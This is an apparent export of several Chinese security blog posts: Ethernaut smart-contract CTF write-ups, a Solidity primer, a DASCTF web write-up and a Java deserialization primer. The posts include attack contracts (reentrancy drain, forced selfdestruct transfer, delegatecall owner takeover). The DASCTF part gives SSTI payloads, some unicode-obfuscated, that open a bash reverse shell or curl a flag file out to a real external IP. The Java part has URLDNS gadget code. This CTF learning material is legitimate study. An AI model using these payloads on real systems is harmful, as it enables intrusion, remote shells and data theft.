^0.4.23;\ncontract Calltest {\n    address public b;\n\n    function test() public {\n        b=address(this);\n    }\n}\ncontract Compare {\n    address public b;\n    address public testaddress;\n\n    event logb(address _a);\n\n    constructor(address _addressOfCalltest) public {\n        testaddress = _addressOfCalltest;\n    }\n    function withcall() public {//通过call方法调用函数\n        testaddress.call(bytes4(keccak256(\"test()\")));\n        emit logb(b);\n    }\n    function withdelegatecall() public {//通过delegatecall方法调用函数\n        testaddress.delegatecall(bytes4(keccak256(\"test()\")));\n        emit logb(b);\n    }\n}\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208222013360.png)\n\n图中可以看到，在使用call方法调用函数时，可以发现`CALLTEST`合约的b已经变成了这个合约的部署地址` 0xDA0bab807633f07f013f94DD0E6A4F96F8742B53`，而Compare合约的地址并没有变化。说明`call`只是在`Calltest`合约中执行了test函数\n\n而在使用delegatecall方法调用函数时，`COMPARE`合约的b变成了合约部署地址，说明这个函数实际上是在`Compare`合约中执行的，也就相当于是把函数复制了一份到合约中执行\n\n那么在这个合约中我们只需要通过fallback执行delegatecall来进入Delegate合约中的pwn方法来执行替换owner\n\n而fallback函数的执行只需要sendTransaction方法，带上data即可执行pwn函数，方法的ID是4字节的sha3\n\n```\ncontract.sendTransaction({data:web3.utils.sha3(\"pwn()\").slice(0,10)})\n```\n\n> 使用`delegatecall` 是很危险的, 而且历史上已经多次被用于进行 attack vector. 使用它, 你对合约相当于在说 \"看这里, -其他合约- 或是 -其它库-, 来对我的状态为所欲为吧\". 代理对你合约的状态有完全的控制权. `delegatecall` 函数是一个很有用的功能, 但是也很危险, 所以使用的时候需要非常小心.\n>\n> 请参见 [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) 这篇文章, 他详细解释了这个方法是如何窃取三千万美元的.\n\n## Force\n\n> 有些合约就是拒绝你的付款,就是这么任性 `¯\\_(ツ)_/¯`\n>\n> 这一关的目标是使合约的余额大于0\n>\n>  这可能有帮助:\n>\n> - Fallback 方法\n> - 有时候攻击一个合约最好的方法是使用另一个合约.\n> - 阅读上方的帮助页面, \"控制台之外\" 部分\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Force {/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n\n*/}\n```\n\n想让合约余额大于0首先想到的就是直接转账了`contract.sendTransaction(instance,1)`，但是由于fallback重写导致我们的交易被回退，如图所示\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208222059265.png)\n\n此时我们就需要用到另一个合约了，在`selfdestruct`函数中会将整个合约销毁并将合约余额强制给予指定地址并且忽略fallback函数，所以这里我们只需要在制作一个新合约，存入代币，销毁发送到题目合约即可\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.4.16;\ncontract Test{\n  address aim;\n  constructor (address t){\n    aim=t;\n  }\n  function a() payable{\n    \n  }\n  function sd(){\n    selfdestruct(aim);\n  }\n}\n```\n\n> 在solidity中, 如果一个合约要接受 ether, fallback 方法必须设置为 `payable`.\n>\n> 但是, 并没有发什么办法可以阻止攻击者通过自毁的方法向合约发送 ether, 所以, 不要将任何合约逻辑基于 `address(this).balance == 0` 之上.\n\n## Vault\n\n> 打开 vault 来通过这一关!\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Vault {\n  bool public locked;\n  bytes32 private password;\n\n  constructor(bytes32 _password) public {\n    locked = true;\n    password = _password;\n  }\n\n  function unlock(bytes32 _password) public {\n    if (password == _password) {\n      locked = false;\n    }\n  }\n}\n```\n\n明显要拿password，但是private怎么拿呢？\n\n> 这涉及到一点：以太坊部署和合约上所有的数据都是可读的，包括这里合约内定义为private类型的password变量，我们可以使用`web3.eth.getStorageAt`来读取合约行对应地址的数据\n>\n> ```\n> web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])\n> ```\n>\n> 第一个参数时对应要读取的合约地址，第二个参数是要读取内容的索引位置(变量是第几个被定义的变量)，第三个参数如果被设置，那么就不会使用默认的block(被[web3.eth.defaultBlock](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#eth-defaultblock)设置的默认块)，而是使用用户自定义的块，这个参数可选项有`\"earliest\"`, `\"latest\"` 和 `\"pending\"`，第四个选项设置回调函数。\n\n所以我们直接读就好啦，password第二个被定义，我们直接读1\n\n```\nawait web3.eth.getStorageAt(contract.address,1)\n```\n\n然后用password解锁就好啦～\n\n> 请记住, 将一个变量设制成私有, 只能保证不让别的合约访问他. 设制成私有的状态变量和本地变量, 依旧可以被公开访问.\n>\n> 为了确保数据私有, 需要在上链前加密. 在这种情况下, 密钥绝对不要公开, 否则会被任何想知道的人获得. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) 提供了一个可以判断某个人是否有某个秘密参数的方法,但是不必透露这个参数.\n\n## King\n\n> 下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.\n>\n> 这么有趣的游戏, 你的目标是攻破他.\n>\n> 当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract King {\n\n  address payable king;\n  uint public prize;\n  address payable public owner;\n\n  constructor() public payable {\n    owner = msg.sender;  \n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  receive() external payable {\n    require(msg.value >= prize || msg.sender == owner);\n    king.transfer(msg.value);\n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  function _king() public view returns (address payable) {\n    return king;\n  }\n}\n```\n\n直接看receive，我们需要出价比原来的king高才能拿到控制权，并且题目中说了在提交实例是关卡会重新尝试夺回王权，也就是再给我们一个更大数额的eth，我们怎么才能防止他通过更高出价来夺走王位呢？\n\n我们只需要在另起一个合约，在合约中设置receive内容为revert函数，这样在我们的合约收到代币的时候就会触发回滚导致king重夺王位失败\n\n```solidity\npragma solidity ^0.6.0;\ncontract AttackKing {\n    constructor(address payable _victim) public payable {\n        _victim.call.gas(1000000).value(0.01 ether)(\"\");\n    }\n    receive() external payable {\n        revert();\n    }\n}\n```\n\n> 大多数 Ethernaut 的关卡尝试展示真实发生的 bug 和 hack (以简化过的方式).\n>\n> 关于这次的情况, 参见: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) 和 [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html)\n\n\n\n\n\n# Re-entrancy\n\n经典的重入漏洞终于来喽\n\n> 这一关的目标是偷走合约的所有资产.\n>\n>  这些可能有帮助:\n>\n> - 不可信的合约可以在你意料之外的地方执行代码.\n> - Fallback methods\n> - 抛出/恢复 bubbling\n> - 有的时候攻击一个合约的最好方式是使用另一个合约.\n> - 查看上方帮助页面, \"控制台之外\" 部分\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Reentrance {\n  \n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] = balances[_to].add(msg.value);\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] >= _amount) {\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\n      if(result) {\n        _amount;\n      }\n      balances[msg.sender] -= _amount;\n    }\n  }\n\n  receive() external payable {}\n}\n```\n\n> 注意这里使用了`call{value:xx}`的形式，`call`是`send`和`transfer`函数底层实现，也是用来转账的。与它们的区别在于，[参考链接](https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/)\n>\n> - transfer:要求接收的智能合约中必须有一个`fallback`或者`receive`函数，否则会抛出一个错误(error)，并且revert（也就是回滚到交易前的状态）。而且有单笔交易中的操作总gas不能超过2300的限制。transfer函数会在以下两种情况抛出错误：\n>   - 付款方合约的余额不足，小于所要发送的value\n>   - 接收方合约拒绝接收支付\n> - send:和transfer函数的工作方式基本一样，唯一的区别在于，当出现上述两种交易失败的情况时，send的返回结果是一个boolean值，而不会执行revert回滚。\n> - call: call函数和上面最大的区别在于，它没有gas的限制，使用call时EVM将所有gas转移到接收合约上，形式如下:\n\n审计合约代码，这个合约的作用类似于银行，donate存withdraw取，那么这个代码问题究竟出在哪里呢，我们直接看存款函数，首先判断我们的账户是否有足够余额，然后给我们的账户转帐，最后扣除余额，看起来都没什么问题，但是如果银行的存款账户并不是一个钱包而是一个合约呢？\n\n这时会直接进入到这个合约的fallback或者receive函数中，这时我们可以编写一个特殊的合约，让接收函数的fallback函数重复调用目标合约的`withdraw`函数，这样合约就会不断给我们所编写的合约转账直至余额为0。具体代码如下\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract attack {\n\n    address payable target;\n    address payable public owner;\n    uint amount = 100000000000000 wei;\n\n    constructor(address payable _addr) public payable {\n        target=_addr;\n        owner = msg.sender;\n    }\n\n    function step1() public payable{\n        bool b;\n        (b,)=target.call{value: amount}(abi.encodeWithSignature(\"donate(address)\",address(this)));\n        require(b,\"step1 error\");\n    }\n\n    function setp2() public payable {\n        bool b;\n        (b,)=target.call(abi.encodeWithSignature(\"withdraw(uint256)\",amount));\n        require(b,\"step2 error\");\n    }\n\n\n    fallback () external payable{\n        bool b;\n        (b,)=target.call(abi.encodeWithSignature(\"withdraw(uint256)\",amount));\n        require(b,\"fallback error\");\n    }\n\n    function mywithdraw() external payable{\n        require(msg.sender==owner,'not you');\n        msg.sender.transfer(address(this).balance);\n    }\n}\n```\n\n1000000000000000\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"智能合约入门","url":"/posts/ad0a0e46.html","content":"\n区块链我来啦\n\n<!--more -->\n\n# 智能合约入门\n\n## Solidity\n\n> Solidity中智能合约的含义就是一组代码（它的 *功能* )和数据（它的 *状态* ）的集合，并且它们是位于以太坊区块链的一个特定地址上的。\n\nSolidity也是一种编程语言，不过它针对智能合约项目进行了全面的支持，要想了解一门语言当然要从编写程序开始咯，那么我们就来写我们的第一个Solidity合约吧\n\n```solidity\n//Name.sol\npragma solidity ^0.4.16;//Solidity必须开头，生命合约版本\ncontract Name{\n    string name=\"Jlan\";//设定状态\n    function getName() public returns(string)//设定功能\n    {\n        return name;\n    }\n    function changeName(string _newName) public\n    {\n        name=_newName;\n    }\n}\n```\n\n以上就是一个非常基础的Solidity合约了，可以看的出合约很像是我们在别的语言中的一个类，确实如此，所以一些面向对象编程的内容也可以套用到Solidity上\n\n在Solidity中，许多的操作都需要花费资源，又名gas，也就是虚拟货币，这些内容将在后面讲到\n\n在给属性增加public属性之后自动生成get方法\n\n### 数据类型\n\n- int\n- uint=一个256位长度的无符号int\n- bytes1......bytes32 一个byte类型是8位\n\n### 关键字\n\n- public\n- view\n- pure\n- returns\n- return\n- payable关键字修饰函数，可以通过这个函数给我们的合约地址充值\n\n回滚函数（fallback）\n\n### 全局属性\n\n- `block.blockhash(uint blockNumber) returns (bytes32)`：指定区块的区块哈希——仅可用于最新的 256 个区块且不包括当前区块；而 blocks 从 0.4.22 版本开始已经不推荐使用，由 `blockhash(uint blockNumber)` 代替\n- `block.coinbase` (`address`): 挖出当前区块的矿工地址\n- `block.difficulty` (`uint`): 当前区块难度\n- `block.gaslimit` (`uint`): 当前区块 gas 限额\n- `block.number` (`uint`): 当前区块号\n- `block.timestamp` (`uint`): 自 unix epoch 起始当前区块以秒计的时间戳\n- `gasleft() returns (uint256)`：剩余的 gas\n- `msg.data` (`bytes`): 完整的 calldata\n- `msg.gas` (`uint`): 剩余 gas - 自 0.4.21 版本开始已经不推荐使用，由 `gesleft()` 代替\n- `msg.sender` (`address`): 消息发送者（当前调用）\n- `msg.sig` (`bytes4`): calldata 的前 4 字节（也就是函数标识符）\n- `msg.value` (`uint`): 随消息发送的 wei 的数量\n- `now` (`uint`): 目前区块时间戳（`block.timestamp`）\n- `tx.gasprice` (`uint`): 交易的 gas 价格\n- `tx.origin` (`address`): 交易发起者（完全的调用链）\n\n### address成员变量\n\n- `<address>.balance` (`uint256`):\n\n  以 Wei 为单位的 [地址类型](https://solidity-cn.readthedocs.io/zh/develop/types.html#address) 的余额。\n\n- `<address>.transfer(uint256 amount)`:\n\n  向 [地址类型](https://solidity-cn.readthedocs.io/zh/develop/types.html#address) 发送数量为 amount 的 Wei，失败时抛出异常，发送 2300 gas 的矿工费，不可调节。\n\n- `<address>.send(uint256 amount) returns (bool)`:\n\n  向 [地址类型](https://solidity-cn.readthedocs.io/zh/develop/types.html#address) 发送数量为 amount 的 Wei，失败时返回 `false`，发送 2300 gas 的矿工费用，不可调节。\n\n- `<address>.call(...) returns (bool)`:\n\n  发出低级函数 `CALL`，失败时返回 `false`，发送所有可用 gas，可调节。\n\n- `<address>.callcode(...) returns (bool)`：\n\n  发出低级函数 `CALLCODE`，失败时返回 `false`，发送所有可用 gas，可调节。\n\n- `<address>.delegatecall(...) returns (bool)`:\n\n  发出低级函数 `DELEGATECALL`，失败时返回 `false`，发送所有可用 gas，可调节。\n\n### mapping哈希表\n\n\n\n使用语法\n\n`mapping(映射关系) 哈希表名称;`\n\n```solidity\npragma solidity^0.4.16;\n\ncontract mappingTest{\n    mapping(address => uint) idmap;\n    mapping(uint => string) namemap;\n    uint sum=0;\n    function register(string username){\n        address account=msg.sender;\n        sum++:\n        idmap[account]=sum;\n        namemap[sum]=username;\n    }\n}\n```\n\n### 函数重载\n\n当使用不同的参数（数量，类型）时可以让函数重载，并且如同uint160与address这样的参数类型也是算不同参数类型，可以编译通过，但会有问题\n\n当使用确定参数调用函数时，如果能同时匹配多个重载的函数，会直接报错，如下例：![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208140247208.png)\n\n在这里test函数调用fun函数时传入了一个确定的参数1，同时匹配了uint类型和uint8类型，此时导致编译失败\n\n而在下面这个例子中，传入的是`msg.sender`，此时编译通过，运行发现结果返回调用了以address为参数类型的fun函数重载，~~为啥啊我也不知道啊啊啊啊啊啊啊啊啊啊~~，后面再看吧😭![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208140250890.png)\n\n### 函数传参\n\n类似python的两种方法，一是按照函数定义的顺序直接填入，二是通过花括号指定传入哪个形参，如下例：\n\n```solidity\npragma solidity ^0.4.16;\n\ncontract parma{\n    uint public num;\n    string public name;\n    function setParam(uint _num,string _name){\n        num=_num;\n        name=_name;\n    }\n    function T1(){\n        setParam(18,\"J1an\");\n    }\n    function T2(){\n        setParam({_name:\"Ben\",_num:20});\n    }\n//    function T3(){\n//        setParam(100);\n//    }\n}\n```\n\n在上面这个例子中，T1，T2形象的说明了函数传参的方式，并且如果加入T3函数代码会发现编译无法通过，这是因为在合约内部的函数调用其他函数时必须严格按照函数定义的形参传入参数，但我们在尝试让用户直接对`setParam(100)`进行调用时会发现调用成功了，并且`_name`被自动赋值为空，如下图所示：~~tmd这种睿智参数传递多少有点大病~~![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208140302099.png)\n\n### 函数返回值\n\nsolidity中的函数可以有多个返回值\n\n如果给了函数返回值的参数名，那么这个参数会以类似形参的方式传入到函数中，我们可以不通过return而直接给这个形参赋值来达到返回值的效果，而如果形参传递和return同时存在，以return为准，~~这不废话吗肯定return优先级高啊，return相当于赋值了还把函数给结束了，后面没操作了可不它高吗~~\n\n```solidity\npragma solidity ^0.4.16;\n\ncontract funReturn{\n    function T1() returns(uint num){\n        return 1;\n    }\n    function T2() returns(uint num){\n        num=2;\n    }\n    function T3() returns(uint num){\n        num=3;\n        return 4;\n    }\n}\n```\n\n### 变量作用域和值传递\n\n作用域以小的为准\n\n### 修饰符\n\n`private`函数只能被合约独立使用，不能被继承\n\n`public`函数可以被任意调用，可以被继承\n\n`internal`函数只能在合约内部调用，不能直接在外部调用，可以被继承\n\n`external`函数不能在合约内部进行调用，只能在合约外部被调用（在函数内部可以通过this来间接调用，也可以通过new创建新合约的方法调用），可以被继承\n\n`pure`不消耗gas，不会读取全局变量，也不会修改全局变量，一个固定输入就会有固定输出\n\n`view`读取全局变量但不修改，不消耗gas\n\n`payable`进行金钱交易时所必须的修饰符\n\n### 值传递和副本拷贝\n\n直接如同a=b这样的传递都是值传递，传入函数都是副本拷贝\n\n### const常量定义（已废弃）\n\n函数中使用constant（版本为0.4.16）修饰，不消耗gas（与view修饰等价，并且将在0.5.0版本中废弃）\n\n对于全局变量（局部不可用）使用constant修饰，无法被更改（就是常量定义嘛～～～）\n\n变量并非所有类型都可以使用常量显示，可使用的类型有`int,uint,string,bytes1-32`\n\n### 构造函数\n\n构造函数与合约同名或者命名为`constructor`（新版本），首先被执行，构造函数传参需要在合约部署时赋予\n\n### 函数modifire（函数修改器）\n\nrequire判断，如果require中的内容不成立，那么后面的代码都不会被执行并且回滚\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208220048145.png)\n\n此处例子中，在合约部署时设定了部署者为合约拥有者，在modifier中验证了函数change的身份，首次我们让函数拥有者5B3进行调用发电函数调用成功，a的值被修改，而当我们切换用户Ab8再进行调用时，会发现调用失败并且报错\n\n```solidity\npragma solidity ^0.4.16;\ncontract modifierTest{\n    address public owner;\n    uint public a=100;\n    function modifierTest(){\n        owner=msg.sender;\n    }\n    modifier OnlyOwner{\n        require(msg.sender==owner);\n        _;\n    }\n    function change(uint _num)OnlyOwner{\n        a=_num;\n    }\n}\n```\n\n```solidity\nmodifier modifierName{\n    require(执行函数要求条件);\n    _;//占位函数\n}\n//函数调用\nfunction funName() modifierName{}\n//该函数执行时会先进入modifier进行判断\n```\n\n第二个应用，判断用户注册\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208220923409.png)\n\n这个例子中我们在注册前先对其要求该address对应的id为0也就是未注册过才可以进入注册函数\n\n```solidity\npragma solidity ^0.4.16;\ncontract modifierTest{\n    address public owner;\n    uint sum=0;\n    mapping(address=>uint) idmap;\n    mapping(uint=>string) namemap;\n    function modifierTest(){\n        owner=msg.sender;\n    }\n    modifier OnlyOwner{\n        require(msg.sender==owner);\n        _;\n    }\n    modifier regConfirm{\n        require(idmap[msg.sender]==0);\n        _;\n    }\n    function register(string name) regConfirm{\n        address account=msg.sender;\n        sum++;\n        idmap[account]=sum;\n        namemap[sum]=name;\n    }\n}\n```\n\n第三个应用，权限管理，代码就不放了自己意会吧\n\nmodifier执行顺序，在有多个modifier被使用时，后面的modifier会与函数一起被放入前一个modifier的`_;`占位符中\n\n### 合约继承\n\n继承语法\n\n```solidity\npragma solidity ^0.4.16;\ncontract father{\n}\ncontract son is father{\n}\n```\n\n可以连续继承，可多重继承，如果有同名属性以最后的合约为准\n\n\n\n对于属性和函数来说private不可被继承\n\n### getter函数\n\npublic属性的变量会自动生成一个同名属性为external的函数，对于mapping类型生成一个有参数的函数，传\n\n### 回退函数fallback\n\nfallback函数，回退函数，是合约里的特殊无名函数，有且仅有一个。它在合约调用没有匹配到函数签名，或者调用没有带任何数据时被自动调用。回退函数是合约里的特殊函数，没有名字，不能有参数，没有返回值。下面来看一个简单的回退函数例子。\n\n```solidity\npragma solidity ^0.4.0;\n\ncontract SimpleFallback{\n  function(){\n    //fallback function\n  }\n}\n```\n\n当调用的函数找不到时，就会调用默认的fallback函数。由于Solidity中，Solidity提供了编译期检查，所以我们不能直接通过Solidity调用一个不存在的函数。但我们可以使用Solidity的提供的底层函数`address.call`来模拟这一行为，关于`call()`函数详见：http://me.tryblockchain.org/Solidity-call-callcode-delegatecall.html 。我们来看个例子：\n\n- **send()函数发送ether**\n\n当我们使用`address.send(ether to send)`向某个合约直接转帐时，由于这个行为没有发送任何数据，所以接收合约总是会调用fallback函数，我们来看看下面的例子\n\n### 合约销毁\n\nselfdestruct(owner);\n\n### storage和memory\n\n全局变量被存在链上，属于storage中的内容，在函数中运行的值都只存在本机中，属于memory中内容，用后即销毁\n\n但是在函数中定义的可变数组是storage类型\n\n\n\n"},{"title":"DASCTF 7月赛","url":"/posts/c1a72657.html","content":"\n谢谢出题人，SSTI🦈我，签到就不说了，直接看后面两个\n\n## Harddisk\n\nSSTI，就是过滤很过分，甚至还滤了g和x这两个单字符，还过滤了`{{}}`和print，注定是没有回显了，要反弹shell了，先试试构造最简单的~~（别说为啥不用别的，都被ban了我怎么用😭）~~ `lipsum.__globals__['os'].popen('sh -i >& /dev/tcp/182.61.46.138/10000 0>&1').read()`\n\n```\n{%set a=\"__globals__\"%}\n{%set d=\"os\"%}\n{%set e=\"popen\"%}\n{%set c=\"bash -i >& /dev/tcp/182.61.46.138/10000 0>&1\"%}\n{%set f=\"get\"%}\n{%set b=((lipsum|attr(a))|attr(\"get\")(d))|attr(e)(c) %}\n```\n\n走一波unicode编码还有空格绕过，就变成了这样\n\n```\n{%25set%09a=\"\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\"%25}\n{%25set%09d=\"\\u006f\\u0073\"%25}\n{%25set%09e=\"\\u0070\\u006f\\u0070\\u0065\\u006e\"%25}\n{%25set%09c=\"\\u0062\\u0061\\u0073\\u0068\\u0020\\u002d\\u0069\\u0020\\u003e\\u0026\\u0020\\u002f\\u0064\\u0065\\u0076\\u002f\\u0074\\u0063\\u0070\\u002f\\u0031\\u0038\\u0032\\u002e\\u0036\\u0031\\u002e\\u0034\\u0036\\u002e\\u0031\\u0033\\u0038\\u002f\\u0031\\u0030\\u0030\\u0030\\u0030\\u0020\\u0030\\u003e\\u0026\\u0031\"%25}\n{%25set%09f=\"\\u0067\\u0065\\u0074\"%25}\n{%25set%09b=((lipsum|attr(a))|attr(f)(d))|attr(e)(c)%25}\n```\n\n执行出错了，估计是没导os模块，走import的路子吧（不知道为啥shell反弹不过来，就用学长给的curl外带吧\n\n```\n{%set a=\"__globals__\"%}\n{%set b=\"__builtins__\"%}\n{%set cmd=\"__import__(\"os\").system(\"curl 182.61.46.138?`cat /f*`\")\"%}\n{%set c=(lipsum|attr(a))|attr(\"get\")(b)|attr(\"get\")(\"eval\")(cmd)%}\n```\n\n同上换一下格式\n\n```\n{%25set%09a=\"\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\"%25}\n{%25set%09b=\"\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f\"%25}\n{%25set%09cmd=\"\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f\\u0028\\u0022\\u006f\\u0073\\u0022\\u0029\\u002e\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0028\\u0022\\u0063\\u0075\\u0072\\u006c\\u0020\\u0031\\u0038\\u0032\\u002e\\u0036\\u0031\\u002e\\u0034\\u0036\\u002e\\u0031\\u0033\\u0038\\u003f\\u0060\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u002a\\u0060\\u0022\\u0029\"%25}\n{%25set%09c=(lipsum|attr(a))|attr(\"\\u0067\\u0065\\u0074\")(b)|attr(\"\\u0067\\u0065\\u0074\")(\"\\u0065\\u0076\\u0061\\u006c\")(cmd)%25}\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207242303093.png)\n\n## 绝对防御\n\n呜呜呜我是笨比，找到了文件都没想着直接打开一下😭\n\n扫不出东西就看看JS吧，其中一个文件的API带了php文件`ImLib.API_PATH = \"/SUPPERAPI.php\";`，看一下，有源码\n\n```javascript\n<script>\n\nfunction getQueryVariable(variable)\n{\n       var query = window.location.search.substring(1);\n       var vars = query.split(\"&\");\n       for (var i=0;i<vars.length;i++) {\n               var pair = vars[i].split(\"=\");\n               if(pair[0] == variable){return pair[1];}\n       }\n       return(false);\n}\n\nfunction check(){\n\t\tvar reg = /[`~!@#$%^&*()_+<>?:\"{},.\\/;'[\\]]/im;\n        if (reg.test(getQueryVariable(\"id\"))) {\n            alert(\"提示：您输入的信息含有非法字符！\");\n            window.location.href = \"/\"\n         }\n}\ncheck()\n</script>\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["web"]},{"title":"Java序列化基础","url":"/posts/a3c4d7f5.html","content":"\n# Java序列化基础\n\n## 序列化与反序列化\n\n序列化就是将一个对象压缩为字节流的形式，而反序列化就是将字节流转换回内存中的对象\n\n### 为什么会不安全\n\n- 对于Java来说，反序列化不安全的点，是在于其反序列化时进行了“额外的操作”（重写readObject方法中的内容）\n- 可能的危险形式\n- 入口类的readObject直接调用危险方法\n- 入口类参数中包含可控类，该类有危险方法，readObject时调用\n- 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用，比如在类型为Object时调用对应的equals/hashcode/toString等方法\n- 构造函数或静态代码块等类加载时隐式执行\n\n### 一些条件\n\n共同条件：实现Serializable接口\n\n入口类 source（重写readObject，参数类型宽泛，最好JDK自带）\n\n调用链 gadget chain\n\n执行类 sink （RCE，SSRF，写文件等）\n\n### 反射\n\n官方释义：Java的反射机制是指在运行状态中，对于任意一个类都能知道这个类的所有属性和方法，并且对于任意一个对象，都能调用它的任意一个方法，这种动态获取信息以及动态调用对象方法的功能称为Java的反射机制\n\n**作用**\n\n- 让Java具有动态性\n- 修改已有对象的属性\n- 动态生成对象\n- 动态调用方法\n- 操作内部类和私有方法\n\n一些反射方法\n\n- `obj.getClass()`获取对象类Class对象\n- `cla.getConstructor(参数1类型,参数2类型)`获取对象指定形式的构造方法Constructor对象\n- `cst.newInstance(参数1,参数2)`通过指定的构造方法新建对一个对应类的对象\n- `cls.getDeclaredFields()`获取所有类中声明的变量，返回一个Field数组\n- `cls.getDeclaredField(变量名)`通过变量名获得该类变量对象，返回一个Field对象\n- `fld.set(对象,新变量值)`给对象设置新变量内容\n- `fld.setAccessible(布尔)`给类的变量设置访问属性，true为可访问\n- `cls.getMethods()`获取类的所有方法，返回一个Method数组\n- `cls.getMethods(方法名,参数范型)`通过方法名获取该类方法，返回一个Method对象\n- `med.invoke(对象,传参)`\n\n反射在反序列化中的应用\n\n- 定制需要的对象\n- 通过invoke调用除同名函数之外的函数\n- 通过Class类创建对象，引入不能序列化的类\n\n### 代理\n\n为其他对象提供一个代理来访问原对象，比如各种的get和set方法就是一种代理\n\n静态代理\n\n\n\n\n\n\n\n\n\n动态代理\n\n需要使用JDK中的Proxy类\n\n\n\n\n\n\n\n\n\n\n\n\n\n### Java序列化实例\n\n需要实现java.io.Serializable接口（该接口是一个空接口）\n\n```java\n//Person.java\npackage top.darkflow;\n\nimport java.io.Serializable;\n\npublic class Person implements Serializable {\n    public String name;\n    public int age;\n\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n}\n//Main.java\npackage top.darkflow;\n\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.ObjectOutputStream;\n\npublic class Main {\n    public static void main(String[] args) throws IOException {\n        Person p=new Person(\"Jlan\",18);\n        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(p);//序列化过程\n        objectOutputStream.close();\n    }\n}\n\n```\n\n一些注意事项\n\n- 序列化针对的是对象而不是类，所以在序列化时静态成员是不会被序列化的\n- 如果子类实现了Serializable接口而父类没有实现，那么在序列化时父类定义的内容不会被序列化\n- 如果类中添加了transient关键字，那么该属性不会被序列化\n\n```java\n//Main.java\npackage top.darkflow;\n\nimport java.io.*;\n\npublic class Main {\n    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(\"ser.ser\"));\n        Person p=(Person)objectInputStream.readObject();//需要强制类型转换\n        System.out.println(p.name);\n        objectInputStream.close();\n    }\n}\n```\n\n- 类中serialVersionUID，如果序列化与反序列化类的serialVersionUID不同会直接抛出异常\n\n### 一个简单的反序列化链\n\n**URLDNS**\n\n- 该链由两个类组成，分别是HashMap和URLStreamHandler类\n\n- HashMap中重载了readObject函数\n\n  ```java\n  for (int i = 0; i < mappings; i++) {\n  \t\t@SuppressWarnings(\"unchecked\")\n  \t\t\tK key = (K) s.readObject();\n  \t\t@SuppressWarnings(\"unchecked\")\n        V value = (V) s.readObject();\n      putVal(hash(key), key, value, false, false);\n  }\n  ```\n\n  此处调用了hash函数，那么如果其中有变量重写了hash函数，那么就有可能有漏洞\n\n- 我们发现URLStreamHandler类中的hashCode函数调用了`getHostAddress`方法，此处对传入参数u进行了DNS查询，此时反序列化链就明显了\n\n- ```\n  HashMap.readObject->URLStreamHandler.hashCode->getHostAddress\n  ```\n\n  ```java\n  public class Main {\n      public static void main(String[] args) throws IOException, ClassNotFoundException {\n          String url=\"http://kcywg9.ceye.io\";\n          URLStreamHandler handler=new SilentURLStreamHandler();\n          HashMap ht=new HashMap();\n          URL u=new URL(null,url,handler);\n          ht.put(u,url);\n          ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream(\"ht.ser\"));\n          objectOutputStream.writeObject(ht);//序列化过程\n          objectOutputStream.close();\n      }\n      static class SilentURLStreamHandler extends URLStreamHandler{\n          SilentURLStreamHandler(){}\n          protected URLConnection openConnection(URL u) throws IOException{\n              return null;\n          }\n          protected synchronized InetAddress getHostAddress(URL u){return null;}\n      }\n  }\n  ```\n\n  